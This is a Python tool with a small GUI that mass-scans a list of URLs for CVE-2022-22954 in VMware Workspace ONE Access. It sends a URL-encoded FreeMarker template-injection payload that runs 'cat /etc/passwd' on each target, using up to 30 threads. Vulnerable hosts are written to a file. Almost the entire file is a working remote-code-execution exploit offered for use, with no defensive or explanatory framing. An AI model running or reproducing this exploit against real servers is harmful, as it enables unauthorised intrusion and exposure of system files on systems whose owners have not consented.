import requests
import tkinter as tk
from tkinter import *
from PIL.ImageTk import PhotoImage
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def vmware_one_access_ssti_exp(url):
    poc = r"""/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            vmware_one_access_ssti_text.insert(END,"---------------------------------------\n[! ! ! ! ! ! ] Vulnerable url:" + url + "\n---------------------------------------\n")
            vmware_one_access_ssti_text.see(END)
            with open ("[exists]VMware_CVE_2022_22954_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            vmware_one_access_ssti_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
            vmware_one_access_ssti_text.see(END)
    except Exception as err:
        vmware_one_access_ssti_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        vmware_one_access_ssti_text.see(END)
def get_vmware_one_access_ssti_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def vmware_one_access_ssti_gui():
    vmware_one_access_ssti = Toplevel()
    vmware_one_access_ssti.geometry("1035x455")
    logo = PhotoImage(file="./logo.ico")
    vmware_one_access_ssti.tk.call('wm', 'iconphoto', vmware_one_access_ssti._w, logo)
    vmware_one_access_ssti.title("VMware Server-side template injection(CVE-2022-22954) [auto-muti-exp]")
    vmware_one_access_ssti.resizable(0, 0)
    global vmware_one_access_ssti_text
    vmware_one_access_ssti_text = scrolledtext.ScrolledText(vmware_one_access_ssti,width=123, height=25)
    vmware_one_access_ssti_text.grid(row=0, column=0, padx=10, pady=10)
    vmware_one_access_ssti_text.see(END)
    addrs = get_vmware_one_access_ssti_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(vmware_one_access_ssti_exp, addr)
    vmware_one_access_ssti.mainloop()